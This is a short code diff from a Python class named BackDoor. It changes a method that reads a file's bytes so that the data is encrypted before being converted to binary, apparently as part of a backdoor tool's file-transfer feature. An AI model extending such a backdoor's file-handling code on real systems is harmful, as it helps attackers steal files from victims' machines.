@@ -331,7 +331,9 @@ class BackDoor:
         """
         with open(path, 'rb') as f:
             data = f.read()
-            binary_data = self.get_bin(data)
+            encrypted_data = self.encrypt_data(data)
+            binary_data = self.get_bin(encrypted_data)
+
 
         return binary_data
 
